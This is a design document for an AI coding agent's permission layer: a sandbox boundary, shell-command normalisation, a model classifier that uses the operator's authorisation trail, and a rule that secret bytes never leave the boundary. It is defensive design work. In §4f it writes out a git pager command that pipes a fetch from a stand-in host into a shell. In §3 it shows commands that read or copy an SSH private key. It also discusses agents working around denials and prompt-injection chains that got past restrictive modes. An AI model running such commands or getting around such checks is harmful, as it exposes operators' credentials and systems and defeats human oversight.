# The boundary, and who decides inside it

Written 2026-09-10, from the operator's directions in one sitting. Companion to
`docs/closed-loop.md` (the frame), `docs/tool-survey.md` §"Sandboxing and permissions"
(the prior art), and `docs/tool-design-brief.md` (the rules every tool follows).

The exec substrate exists (`crates/tools/src/exec/`) and says plainly that it **is not a
sandbox**: a spawned command reads the operator's entire filesystem. This document is what
goes around it.

---

## 1. The measured case for a model in the loop

Not a preference. As of 2026-08-14 Claude Code's auto mode is default on paid plans, and
the numbers that decide it are:

| | catches |
|---|---|
| the model classifier | **~83%** of overeager behaviours |
| **a human in the approval loop** | **~67%** — humans miss about a third of dangerous requests |

So the classifier is not a risky substitute for a careful human. It is **better than the
fatigued human clicking yes**, and approval fatigue is the mechanism that makes the human
number so low. The question is not "can a model be trusted with this" but "is it better
than what it replaces", and that is measured.

The other number is the one that keeps it honest: **~17% get through.** Anthropic's own
framing — *auto mode is "one layer of defence-in-depth inside a sandbox, not a substitute
for one."* 2026 produced prompt-injection chains that bypassed restrictive modes. So:
**boundary first, classifier inside it.** A classifier without a boundary is an
open-loop stepper with a good prior.

## 2. The constraint that reshapes everything: authority is contextual

> *"it is ok to use ssh key if i said ssh to that host and it is absolutely out of
> question to read private key or copy it"*

A stateless command classifier **cannot be correct**, because the same command is
authorised or not depending on what the operator just said. `systemctl restart X` after
*"yeah restart"* is the requested action; the identical string unprompted is a decision
nobody made. So the adjudicator's input is **not a command**. It is a command *plus what
authorised it*.

That is why the seam takes a model rather than a table, and it is already the design's
position: `Adjudicator`'s doc says §11.1's three are *"boundary, human, model — three
implementations of this, and the design's job is to make them interchangeable rather than
to rank them"*, and the operator recorded *"it is ok if I plug a model for auto mode"*
(`docs/design-brief.md:159`).

**What follows for the request object.** §11.2's `AdjudicationRequest` carries the action
and its class. It must also carry the **authorisation trail**: the operator's own words
that bear on this action, and their distance in the conversation. An adjudicator that
cannot see *"yeah restart"* will refuse the thing that was asked for, and a seat that
refuses what was asked for gets switched off.

## 3. But some things are not adjudicable, and the rule is about FLOW, not access

The tempting rule is a forbidden-path list. We have one — `NEVER_WRITE` — and it is the
wrong shape twice over.

**First, it is a string check, so it is wrong in both directions.** A `web_search` query
that merely *mentions* `.password-store` is denied (a real false positive, T25/D20), while
a path that reaches the same file by another spelling is not.

**Second, and more important: `ssh` reads the private key.** So "never read `~/.ssh/id_rsa`"
cannot be the rule — it would forbid the authorised case. What separates them is not the
operation on the file, it is **where the bytes end up**:

| | bytes go | verdict |
|---|---|---|
| `ssh user@host` | into `ssh`, consumed inside the boundary, never surfaced | **adjudicable** — allowed with authorisation |
| `cat ~/.ssh/id_rsa` | into a tool result, therefore into the transcript, therefore into the model's context and the store | **inexpressible** |
| `cp ~/.ssh/id_rsa /tmp/k` | to a location with weaker protection, and then anywhere | **inexpressible** |
| `scp ~/.ssh/id_rsa remote:` | off the machine | **inexpressible** |

### Danger is not a property of the string

Operator: *"rm -rf / can be allowed if it is the intent."*

That removes the mechanism this section was reaching for. Continue pairs a shell-accurate
parse with **a hard list of destructive commands blocked outright**; the parse is the part
to copy and **the block list is not.** `rm -rf /` on a scratch VM is the intent. Danger is
a **mismatch between what an action does and what was authorised**, and a block list
encodes the wrong thing and then has to be widened by exception every time somebody
legitimately needs a listed command — which is how block lists die.

So layer A emits an **intent with its scope**, not a verdict and not a score: file read,
network access, code execution, privilege escalation, destruction, disclosure, each with
what it touches. Scope is load-bearing — *destroys `target/debug`* and *destroys the
project* are different intents, and the 4B classifier measured on 2026-09-10
distinguished exactly that pair, unprompted: *"action targets wrong path, no authorization
context provided."*

A score cannot be argued with. An intent can be checked against a sentence the operator
actually said. That is why the reformulation is the key rather than a refinement.

### Then why is a private key absolute? Because consent is not the operator's to give

The asymmetry is not danger. It is **who bears the consequence, and whether they can
consent to it in-session**:

| | consequence lands on | can the operator consent? |
|---|---|---|
| `rm -rf /` | **the operator**, and they own the loss | **yes** — their machine, their call |
| `cat ~/.ssh/id_rsa` | every host that key opens, the org, whoever reads the transcript later | **no** — a yes does not bound where the bytes go once they are in a context, a store and possibly a provider |

Destruction is authorisable because the person authorising is the person harmed.
Disclosure is not, because saying yes does not un-disclose it afterwards.

So the inexpressible tier is **narrow**: irreversible disclosure of a secret across the
boundary, and nothing else. Not "destructive", not "dangerous". This also lines up with
§11.3's existing `reversibility` field — destruction is reversible in the sense that
matters, the operator owns the loss and chose it; disclosure is not reversible in any
sense.

So the invariant, stated once:

> **Secret bytes may be consumed by a process inside the boundary. They may never enter
> the transcript, and they may never leave the boundary.**

That is a data-flow rule, and it has three properties a path list does not:

1. It permits the authorised case **without an exception**, so nobody has to widen the
   list to get work done — which is how path lists die.
2. It is enforceable at a real edge (what a tool returns, what crosses the network
   namespace) rather than at a spelling.
3. It makes the prohibition **structural**. §2's two tiers are therefore not "high risk"
   and "low risk" but **adjudicable** and **inexpressible** — and no context, no
   classifier verdict and no operator instruction promotes the second tier into the first.
   `docs/tool-design-brief.md` §2.4: make the mistake unspellable.

## 4. The three layers, in build order

**Layer 1 — the boundary. Project-scoped namespaces plus cgroups.**

Half exists: `crates/tools/src/exec/scope.rs` has the cgroup v2 tree, three scopes
(`turn`/`session`/`explicit`), and a child scope's cgroup is a *directory inside* its
parent's so a parent reaps its children by construction. A process joins before `exec`, in
a wrapper that `exit 125`s rather than running unscoped.

Missing: the namespace half. Mount (a project-rooted filesystem view, so the secret is not
merely unreadable but **absent**), PID (so the process cannot see or signal the operator's
daemon or the model server), network (so egress is a decision rather than a default), and
user. Absence beats denial: a file that is not in the mount namespace needs no rule and no
classifier.

**Layer 2 — normalisation. Tree-sitter, and we already have the grammar.**

`crates/code/Cargo.toml` already lists `tree-sitter-bash 0.25`, added for `outline`. No
new dependency.

This matters for a specific reason. Every surveyed harness that gates on a shell command
decides on a **string the shell will reinterpret**, and G1's own predicate checker concedes
it: *"not a shell parser… `eval`, here-docs, aliases, `$(...)` nesting past one level are
unhandled"* — it calls itself a diagnosis, not the mechanism. A decision made on a string
whose meaning does not exist yet is theatre.

Parsing through a **grammar** means the gate and the classifier see the same structure the
shell will execute: which binaries, which arguments, which redirections, which
substitutions, where the data flows. And the honest limit stays honest — a construct the
grammar cannot resolve (a command built at runtime) is **not classified as safe**; it is
reported as unresolvable, which is `not_run`, not `ok`.

**Layer 3 — the adjudicator, with the conversation.**

A small model, resident, seeing the normalised action plus the authorisation trail. Two
mechanisms to take from the prior art:

- **Milliseconds, not seconds.** It sits in the tool path.
- **The consecutive-denial circuit breaker.** Auto mode pauses after **3 consecutive
  denials for the same task direction** and falls back to asking. That is a closed loop
  where the denial rate is the error signal, and it is what stops a classifier from being
  argued down one call at a time.

And the failure mode that must be designed first, because it is the one that converts a
guard into a rubber stamp: **an unavailable or timed-out classifier fails CLOSED.** It
returns `NotRun` — *nobody decided* — never `Denied` (which claims a decision) and never
`Admit`. `NoAdjudicator` already behaves exactly this way and is the pattern.

### Which model

| candidate | weights | co-resident with Flash-Next? |
|---|---|---|
| dense Qwen3.8-27B | 23.6 GiB | **no** — ~22.3 GiB free |
| **Qwen3-Coder-Next Q4_K_M** | **18.5 GiB** | **yes**, tight once KV is counted |

§11.7 recommends the dense 27B, and it is also the falsifier's control model
(`docs/glm-and-dense-attention.md` §4.2). But an adjudicator has to be **always on**, so
the dense model means swapping Flash-Next out and Coder-Next is the one that co-resides.
Different jobs, different answers: the control run wants a swap, the adjudicator wants the
smaller MoE.

## 4b. A denial the operator cannot see manufactures the workaround

Operator, on living with this in another harness:

> *"when it denies it doesnt surface it to me in anyway - and models including you then try
> to workaround the denial which sometime or mostly doesnt work and the task stops anyway"*

The chain matters more than the complaint, because it shows the design causing the
behaviour rather than the model choosing it:

1. the classifier denies
2. the operator is not told
3. the model sees an unexplained failure and infers **the approach was wrong**, not
   **the action was forbidden**
4. so it tries a variant — the routing-around every rule in this repo forbids, **induced
   by the design**
5. the variant fails, or is denied too
6. the task dies, and the operator sees only a dead task, never the decision that killed it

So §11.5's *"the audit is log-only and never enters the model's context"* was answering the
wrong question. **Three parties, three visibilities, and conflating any two is a defect:**

| party | must see | today |
|---|---|---|
| the model | that it was refused, by whom, on what basis | `NotRun` carries this |
| **the operator** | **every denial, when it happens** — it is a decision taken on their behalf and they alone can lift it | **blind** |
| the durable log | all of it, for §4c's corpus | §11.5's rows |

What follows: a denial **emits to the head immediately**, not at turn end and not on
request. The grant path is reachable **at the moment of denial**, not after the task has
died — `docs/closed-loop.md` §4 says a refusal that can only be routed around teaches
people to route around refusals, and a refusal the operator cannot see is one they cannot
lift, which is the same thing with an extra step. And the refusal text must make
**forbidden** unmistakable from **failed**, because that one distinction is what stops
step 3.

## 4c. The corpus is a side effect of §4b, and only of §4b

> *"so my inputs on model decision should be together with some prior context a fine
> tuning input."*

The audit row is not `(action, decision)`. It is:

```
normalised action  +  authorisation trail  +  the model's verdict  +  what the OPERATOR decided
```

**The disagreements are the training signal** — every override is a labelled example of the
classifier being wrong in a named direction, produced by working rather than by a labelling
project. §11.5's rows already exist and are already kept out of the transcript, so the
mechanism is there; what it needs is the verdict and the override as **separate** values
(never the override overwriting the verdict) and the trail stored as **what was actually
shown to the model**, not a later reconstruction.

And the two sections are one requirement: **an operator who never sees a denial can never
override it, so the invisible-denial defect also starves the corpus.** A harness that hides
its refusals cannot learn from them.

This is the closed loop pointed at the classifier itself — the audit log is the encoder,
the operator's overrides are the error signal, a fine-tune is the correction. Same shape as
the fidelity gate standing between the harness and its own source.

## 4d. Neither layer is trustworthy alone, so four outcomes and earned authority

Operator, on being shown the 7-of-7 probe:

> *"tho not sure if i can trust that much lol. so stage A should have a fixed list of
> things we ask a user about anyway … the problem as i see it is that not layer a not
> layer b are ideal."*

Correct on both counts, and the second is the design constraint. **Layer A can misread
intent** — aliases the parse never sees, unresolvable constructs, the whole GuardFall
class. **Layer B is calibrated on nothing** — seven hand-written cases is a smoke test.
Two uncertain layers composed must not produce a confident auto-approve.

### An always-ask list is not the block list §3 deleted

A **block list** says *never*, and it was right to remove: `rm -rf /` can be the intent.
An **always-ask list** says *the human decides this one, every time, however confident
anything is*. It preserves the operator's authority to authorise anything while removing
the model's authority to authorise it **on their behalf**.

It is deterministic, it lives in layer A, and **the classifier cannot shrink it**. Only
the operator can, and each removal is a recorded decision — a corpus row like any other.

### Four outcomes, and they must not collapse

| outcome | who decides | when |
|---|---|---|
| **inexpressible** | nobody, ever | secret bytes crossing the boundary — §3, and nothing else |
| **always ask** | the operator, every time | layer A's fixed list, whatever layer B says |
| **B may approve** | the model, if authorisation is clear | the rest, within earned scope |
| **auto** | nothing is consulted | reads inside the boundary (clause 4) |

**Layer B cannot promote out of the first two.** It can only move `B may approve` from ask
to admit. That belongs in a signature that cannot return `Admit` for those classes, not in
a check a later refactor can invert.

### Layer B earns its scope; it does not start with it

The answer to *"we cannot be sure it is calibrated"* is not to trust it less in prose. It
is: **ship the narrowest useful authority, let every verdict and every override be a
corpus row (§4c), and widen only on a measured agreement rate for a named class.**

Tonight's numbers are the honest baseline and are **not** a calibration:

| model | matched pairs discriminated | verdicts | warm latency |
|---|---|---|---|
| **Qwen3-4B-Instruct-2507-Q6_K** | **3 of 3** | 7/7 | **57.8 ms** [57–58] |
| Qwen3-1.7B-Q6_K | 1 of 3 | 5/7, all errors over-refusal | 127 ms [84–305] |

Seven hand-written cases. Cite it as a smoke test or not at all. Two things it did settle:
the 4B is better on **both** axes because the 1.7B is a hybrid *thinking* model and the
2507 Instruct line is not — a thinking model is the wrong shape for the tool path; and
per-case accuracy **flatters** a model that always refuses, so the metric is **pairwise
discrimination**, which moved the 1.7B from "5/7, decent" to "does not discriminate on
restart or on path scope".

Over-refusal is not the safe direction here. It is the direction that produces §4b's
workaround loop.

## 4e. Four axes, named points, and dependencies

Operator, after being shown a design with roles, tiers, grants and adjudicators as four
independent systems, and then a proposal to collapse them into one dial:

> *"it is ok to have four axes, they should be composable to dots in that 4 dimensional
> space and the dots have names and dependencies"*

Both of my positions were wrong. Four separate systems is four things to configure for
one decision; a flat dial throws away reachable coordinates. **The axes are the
mechanism; the named points are the surface.**

### The axes

1. **role** — which tools are seated
2. **tier policy** — what asks (`Auto` / `MayApprove` / `AlwaysAsk` / `Inexpressible`)
3. **grant scope** — what persists from an answer
4. **adjudicator** — who decides

A **point** is a named coordinate:

```
Mode {
    name:        "writes allowed",
    role:         coder,
    tiers:        write→MayApprove, exec→AlwaysAsk, read→Auto,
    grants:       session,
    adjudicator:  console,
    requires:    [ WritableBackend, ReachableAdjudicator ],
}
```

Unnamed coordinates stay legal. The names are what an operator picks, not a cage around
what is expressible.

### Roles are not the approval mechanism

They answer *which tools*, never *how much approval*. Conflating them is what produced
the defect the operator hit: `--role coder` meant both "has write" and "asks about
writes", so a session without it reported **"no edit tools"** with no way to change it in
place — and a capability gap the model cannot see past reads to it as a fact about the
world rather than a decision it could ask to have lifted. That is §4b's chain arriving
through a different door.

### Dependencies are the load-bearing part

Each point declares what it **requires**. Selecting it checks them, and an unmet
prerequisite **refuses by name, saying what is missing and how to attach it** — never a
silent downgrade to a weaker point, which is `docs/tool-design-brief.md` §3b's
degrade-to-absence rule applied to configuration.

| point | requires | on this box, measured 2026-09-10 12:xx — **re-check when D25 lands** |
|---|---|---|
| **read-only** | — | satisfied |
| **always-ask** | a *reachable* adjudicator | **blocked: D25** — the console adjudicator reads the daemon's stdin and a head cannot answer |
| **writes allowed** | writable backend + reachable adjudicator | **blocked: D25** |
| **automode** | an oracle | **blocked: VRAM/model.** Selectable, refuses by name |
| any exec point | confinement available | satisfied — `Bwrap` probes, `NoConfinement` refuses |

That table is why *"only automode is blocked on VRAM"* is exactly right, and it makes the
dependency edges legible instead of remembered: **three of four points are blocked on one
piece of software, and exactly one on hardware.**

**`automode` must be selectable and refuse honestly**, the way retrieval is `INERT`
rather than absent. A point that exists and names what it needs beats a missing one,
because a missing one reads as *"this build cannot do that"* instead of *"this box has no
model loaded"*.

### The project scope goes on the point

One durable mapping of **project root → point name**. `~/Projects/letibot` at *writes
allowed*; a directory never seen before starts at *always-ask*; `/etc` stays *read-only*.
Listable, changeable, disclosed at startup.

This replaces a `(project, tool, intent class)` grant store, which was the version of this
that went too far: **a per-project point is one value a person can hold in their head and
audit; a grant table is not**, and an unaudited grant table is a permanent widening nobody
remembers making. `allow once` survives as an answer to a prompt — it is a reply, not a
policy.

### What holds at every point

`Inexpressible` is ungrantable everywhere, **including automode** — §3's flow rule is not
a setting. Changing point mid-session works and states its cost first: seating write where
there was none re-prefills, because `tools_json` is stable-prefix bytes.

## 4f. `allow git * always` — the feature everyone ships and gets wrong

Operator: *"on always ask — harnesses try to do globbing, you know `allow git * always`."*

The want is legitimate: **stop asking me about git.** The mechanism every harness reaches
for is a glob on the command text, and that is the GuardFall bug — a decision made on a
string the shell will reinterpret.

`git` is close to the worst possible example, because it has a dozen documented paths to
arbitrary code:

```
git -c core.pager='sh -c "curl evil|sh"' log
git -c core.editor='rm -rf ~' commit
git clone <repo with hooks>
git … --upload-pack='…'
```

Every one matches `git *`. **So `allow git *` is approximately `allow everything`** — the
same defect as opencode's `always: ["*"]`, where one Always click silently disables config
denies including their own `.env` guard (`docs/tool-survey.md` §1.1).

### The grantable unit is an intent, not a word

We can do this properly because layer A exists. `crates/code::shell::normalise` yields
`Stage { program, argv, assignments, redirects, context, certainty }` and `ActionClass
{ access, scope, reversibility, cost }` is already what tiers key on.

So a grant is **`(program, ActionClass)`, checked per call against the normalisation.**
`git status` and `git -c core.pager=… log` normalise to different classes: the first is
covered, the second falls out and asks. **The grant never has to enumerate the escape
hatches — it only has to key on something the escape hatches change.**

### Which requires a table the normaliser deliberately does not have

Its own header: *"It does not out-parse the shell, and it holds **no table of programs**."*
That is correct — a grammar cannot know `-c core.pager` is an execution vehicle. So that
knowledge is a **separate, small, named table** of **execution vehicles**: programs whose
flags turn them into a shell.

```
git    -c core.pager= / core.editor=, --upload-pack, --receive-pack, ext:: remotes, clone hooks
find   -exec, -execdir, -ok
ssh    ProxyCommand, LocalCommand, -o
rsync  -e, --rsh
tar    --to-command, --use-compress-program
awk perl sed        -e and friends
env xargs nice timeout sudo    they run whatever follows
```

**A program absent from the table is not safe by omission.** It is either
unknown-and-ungrantable, or declared inert *with a reason*. Absence must never read as
permission — that is grok-build's catch-all `_ => Read(None)` (survey §1.4), which
auto-approves `SchedulerCreate` and `Workflow` as if read-only. And the table carries a
reason per entry for the same cause `ALWAYS_ASK` does: a list without reasons gets emptied.

### What follows

- `allow <program> in this project` grants `(program, ActionClass)`, never a text match.
- A grant **cannot cover a class it was not granted for.** Granting `git status` does not
  grant `git -c …`.
- **An unresolvable normalisation is never covered by a grant.** It is already `NotRun`;
  a grant must not be able to rescue it.
- The grant states **what it covers in class terms** when offered, so the operator sees
  what they are agreeing to: *"git — reads and writes inside the project, NOT code
  execution."*

### Keep the glob. It is how a person expresses this, and it is their foot.

§4f's conclusion — grant on the intent, not the word — is right about the **mechanism**
and wrong if it removes globbing. Operator:

> *"how we do it with claude code in ask-me mode: I said, write a globbing list for
> read-only git commands and for write commands like push. and that was allowed. so not
> `git *` but `git status`, `git commit` and so on. and that is the key — we need to keep
> globbing as a way for users to shoot in the foot."*

Two things in that, and the second is a design position worth holding.

**The workflow is: the model proposes, the operator approves.** Asked to stop being
prompted about git, the model writes the list *split by what the commands do* —
`status|log|diff|show|branch` as reads, `push|commit|merge` as writes. That is better than
either extreme: better than `git *`, which grants the escape hatches, and better than a
system that only accepts machine-derived classes, which cannot express *"these ones, I
know what they do"*. It is also the same shape as automode reading man pages (§4g): the
model does the tedious enumeration, the human keeps the decision.

**And a hand-written glob must stay possible even when it is a bad idea.** A permission
system whose safe path is too rigid gets turned off wholesale, and then nothing is
guarded. Paternalism has a failure mode and it is the worst one.

So globbing is first-class. What it does **not** get is silence:

- **A glob is shown in class terms before it is accepted.** *"This matches 47 commands,
  including 3 that can execute arbitrary code (`-c core.pager`, `--upload-pack`, `ext::`)."*
  That is informed foot-shooting rather than blind — the muzzle direction is visible.
- **A glob can reach `MayApprove` and `AlwaysAsk`. It can never reach `Inexpressible`.**
  §3's flow rule is not a setting, and a user-written glob is still a grant. You can shoot
  your foot; you cannot shoot your head.
- **A glob never covers an unresolvable normalisation.** `NotRun` stands. If layer A could
  not read the command, no pattern written in advance about a command nobody could parse
  applies to it.

The difference from every harness in the survey is not that we refuse the glob. It is that
`git *` here **tells you it includes the execution vehicles**, and opencode's
`always: ["*"]` silently disables the operator's own `.env` guard.

## 4g. Automode reads the documentation, and must be made to

Operator: *"the automode can reach to man pages and docs to see wtf that command is
doing"*, and then: *"in automode the classifier must be **encouraged** to read damn
documentation."*

The second sentence is the design requirement. A classifier that can read the docs and
does not is worse than one that cannot, because its guess wears the same clothes as a
grounded answer — which is §8.2's abstention failure, one layer up.

### Why this dissolves the table's real problem

A hand-written execution-vehicle table always lags: new tools appear constantly and every
miss reads as permission. But *"does this program have a flag that runs arbitrary code"*
is a **documentation question**, not a judgement. `man tar` says `--to-command` runs a
command. That is a fact on the box, not an inference about intent.

Three properties make it work here where a per-call classifier would not:

- **Cacheable per `(program, version)`.** `git` is classified once, not per call. So
  layer B's millisecond budget does not apply — a slow, careful answer is fine.
- **Citable.** The verdict carries the section it came from, so an operator can check it.
  That is a different epistemic object from *"the model thinks this is safe."*
- **Fails closed naturally.** No documentation, no model, unknown program → ungrantable.
  Absence still is not permission.

### The rule that makes "encouraged" real

**A classification of an unknown program is not a verdict unless it cites what it read.**
An uncited guess is `not_run` — *nobody checked* — not a safe default. That is the same
distinction the whole tool set runs on: `denied ≠ failed`, `unresolvable ≠ safe`,
`backgrounded ≠ finished`, and now **`unchecked ≠ inert`**.

So the classifier gets documentation reading as a first-class, cached, read-only
capability, and its output shape *requires* the citation for anything not already in the
hand-written seed. A program already in the seed needs no reading — that is what the seed
is for.

### What the table becomes

Not *the* list. **The seed, plus a provenanced cache:**

| provenance | for |
|---|---|
| `hand-written` | the ones we cannot afford to get wrong — `git`, `find`, `ssh`, `sudo` |
| `man(1) §…` | the long tail, derived and cited |
| *absent* | unknown, and therefore **ungrantable** |

Which lets the disclosure say *"14 programs classified: 6 hand-written, 8 derived, 3
unknown and ungrantable"* — a sentence with denominators, which is the house standard.

### One trust boundary to build in from the start

**`man git` is not `./tool --help`.** A system man page is part of the OS install. A
project-local binary's `--help` is attacker-controlled content in exactly the way
`web_fetch`'s payload is (§4 layer 3, and `docs/tool-survey.md` on prompt-injection
chains). So the classifier reads **system documentation paths**; a program that documents
itself only from inside the workspace stays **unknown**, and unknown is ungrantable.

### The classifier is not a different kind of decider. It is the same one, automated.

Operator: *"same way as me btw — ideally if I'm not lazy I will read wtf the model wants.
But if I know that `git commit` is ok I will do globs."*

That is the design, stated from the human side, and the symmetry is exact:

| the operator | the classifier |
|---|---|
| reads what the model is actually asking for | reads the documentation, cites the section |
| already knows `git commit` is fine → writes a glob | hand-written seed entry |
| is lazy and globs `git *` anyway | an uncited guess |

**All three rows are legitimate.** Laziness is not a defect to be designed out — it is how
anyone works, and a system that forbids the shortcut gets switched off (§4f). What the
design owes is not prevention but **legibility**: which of the three you took must be
visible afterwards.

So the provenance field is not bookkeeping. It is the same taxonomy a person uses on
themselves — *I knew this* / *I checked this* / *I did not look* — reflected back in a form
they can audit. An operator reading *"8 derived from man pages, 3 unknown and
ungrantable"* is reading their own reasoning, which is why it is a better disclosure than
a confidence score.

And it is why an uncited classification is `not_run` rather than a weak yes: a human who
globs `git *` without reading has not decided that git is safe. They have decided not to
find out. Those are different, and the record should say which one happened.

### And it feeds the corpus

An operator overriding a derived classification is a labelled example of the classifier
being wrong in a named direction — §4c's corpus, produced by working rather than by a
labelling project.

## 4h. What the classifier is shown — four inputs, and the join between two of them

Operator: *"the challenge for the autoclassifier is to capture intent, and map with what
it understands about commands. The hardcoded allow/deny lists in harness config and
previous user answers ideally are inputs too."*

Four inputs, and naming them settles what the seam has to carry:

| # | input | where it comes from | exists |
|---|---|---|---|
| 1 | **the normalised action** — intent, scope, program class | layer A (`code::shell::normalise` + the vehicle table) | yes |
| 2 | **the authorisation trail** — what the operator said, and how long ago | `AuthorisationTrail`, filled from the transcript | yes, uncalled |
| 3 | **standing config** — `ALWAYS_ASK`, the seed table, the operator's globs, the per-project point | §4e, §4f | partly |
| 4 | **previous answers** — what was decided on actions of this shape before | the §11.5 audit rows | recorded, never read back |

### The join between 1 and 2 is the actual problem

*"Capture intent, and map with what it understands about commands"* is one sentence
describing the hard part: `"yeah restart"` and `systemctl --user restart glm.service` have
to be recognised as the same thing. That is not classification and not parsing — it is
**alignment between a human utterance and a normalised action**, and it is the only part
of this that genuinely needs a language model.

Everything else in the four is lookup. This is the join, and it is why the seam takes a
model rather than a table (§2).

### Previous answers are a RUNTIME input, not only a corpus

§4c filed the audit rows as fine-tuning material. That was too narrow. Read back **at
decision time**, they make the classifier better with **no retrain**, and its reasoning
stays legible — *"you allowed this shape twice in this project"* is inspectable in a way a
weight is not. Given nobody has fine-tuned anything here, this is the difference between
history being useful now and useful eventually.

### But history is evidence, never precedent

The failure this invites: an answer given once by accident argues for itself forever, and
the classifier entrenches a mistake it can no longer be talked out of. So the same rule
`docs/memory.md` §4 already reached for a different reason applies here —
**surface it, do not apply it**:

- prior answers are **shown to the decision**, not substituted for it
- they carry their **count and their age**, because *"once, three weeks ago"* and *"nine
  times this week"* are different facts and a bare *"previously allowed"* hides which
- **a denial is history too.** A classifier shown only the approvals is being told a
  one-sided story about its own record.
- and they never lift a tier: history cannot promote out of `AlwaysAsk` or
  `Inexpressible`, for the same reason a glob cannot (§4f).

### What this means is buildable now

Inputs 1, 3 and 4 are all deterministic lookups against things that already exist or are
being built. **The audit rows are written and never read** — closing that loop is the
cheapest large improvement available, and it does not wait on VRAM. Only the 1↔2 join
does.

## 5. Open

Layers 2 and 3's seam were **built** on 2026-09-10 — `crates/code/src/shell.rs`,
`crates/tools/src/intent.rs`, `crates/tools/src/authorise.rs`, and the gate in
`crates/tools/src/adjudicate.rs`. §4's four outcomes, the always-ask list, the flow rule
and the earned scope are all code now. What follows is what building them **settled**,
and what it did not, recorded here so the next reader is not told something the code has
since disproved.

### Settled by building it

- **~~Whether the classifier sees the raw conversation or a summary of the
  authorisation.~~** **Neither.** It sees `authorise::ModelBrief`, which has no field
  holding the command as written: the *post-expansion* words, the scoped intents, the
  regions, and the operator's utterances with their distance. The injection surface the
  question worried about is real, and it is why layer B may only ever widen. A surveyed
  harness gets the layering right and still shows its classifier the raw string, which
  launders the vulnerability through the model rather than solving it — and a test here
  asserts the raw text never reaches the oracle, which caught a leak through the request
  summary while it was being written.

- **~~What counts as "the same task direction".~~** `authorise::TaskDirection` =
  `(tool, intent set, effect scope, region set)`. Not the arguments — they change on
  every re-spelling, so the counter would never reach three and the breaker would be
  measuring typing. Not the tool alone — unrelated denials would trip it. Where the
  definition is wrong is written beside it: it over-merges, and every error mode pushes
  toward asking a human, which is the direction a breaker should fail in.

- **~~Whether `NEVER_WRITE` survives at all.~~** **Yes, demoted.** Still the first
  precheck, still overridable by nobody, and it no longer decides anything interesting:
  the flow rule does, and needs no allowlist of programs. T25/D20's false positive is
  gone by construction — a `web_search` query is not a path, and `intent::Region` places
  paths rather than matching spellings.

- **~~A hard list of destructive commands.~~** **Deleted, and `ALWAYS_ASK` is not it.**
  §4's distinction is now load-bearing in code: a block list says *never* and gets widened
  by exception until it dies; an always-ask list says *the operator decides this one*.
  Three separate mechanisms keep the classifier from shrinking it — the tier mints no
  `Adjudicable`, the gate refuses to record a class grant for one, and the prompt does not
  offer a standing-grant option at all.

### What layer 1 must guarantee for layer 2 to mean anything

**A resolved parse is not a resolved meaning.** A grammar reads text; a shell resolves a
bare command name through aliases, functions and `PATH`, none of which are in the text —
which is how the survey's best parser is defeated. So `intent::ShellTrust` defaults to
`Unknown`, under which a **bare** name is unresolved and the command is `not_run`; an
absolute path is not shadowable and is unaffected.

The gap is small and specific, because `exec/host.rs` already spawns `/bin/sh -c`:
non-interactive and non-login, so no rc file is read, and `/bin/sh` is `dash` here, which
reads `$ENV` only when interactive. What remains before
`Surroundings::with_pinned_shell` can honestly be called:

1. `env_clear()` before the explicit `env` pairs, so `PATH` is pinned rather than
   inherited.
2. Unset `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`. `BASH_ENV` **is** sourced by bash for
   non-interactive shells, so a distribution where `/bin/sh` is bash has a real injection
   point this box does not.

Stated as a requirement rather than assumed, because a requirement crosses a merge where
an assumption does not.

### Still open

- **How a denial is presented without becoming a nag.** §4b requires every denial to
  surface; a session that denies often must not turn into a wall of notices. The
  consecutive-denial breaker is part of the answer — it stops the *second* attempt
  becoming a third notice — and probably not all of it. `DenialNotice` carries
  `BreakerState`, so a head has what it needs to collapse repeats, and nothing does yet.

- **Where the transcript edge is enforced.** Narrower than it was.
  `shell::Stage::stdout_surfaces` is the structural half, and §3's rule is decided on it.
  What is still missing is the single choke point every tool result passes through: today
  each tool builds its own body, and `Baseline::of_paths` covers the path-shaped tools by
  *reproducing* the rule rather than by sharing an edge. Two implementations of one
  invariant is how invariants stop agreeing.

- **What a fine-tune needs that the row does not yet carry.** `AdjudicationRow` keeps the
  action, the trail as shown, the model's verdict and the operator's override as separate
  values, which is the shape §4c asks for. It has no wall-clock timestamp
  (`letibot-transcript` does not stamp items, so `Utterance::seconds_ago` is `None` unless
  a session loop supplies it), no record of which *model build* answered, and no outcome
  after the fact — whether an admitted action turned out to be what the operator wanted is
  not captured anywhere, and that is the label a calibration would most want.

- **The model itself is not built here.** The seam takes an `AuthorisationOracle`; the
  fake is `ScriptedOracle`; what a real one needs is written into that trait — a
  `ModelBrief` and never a string, a `budget()` it is abandoned for overrunning, and a
  `scope()` earned by measurement rather than granted by assumption.
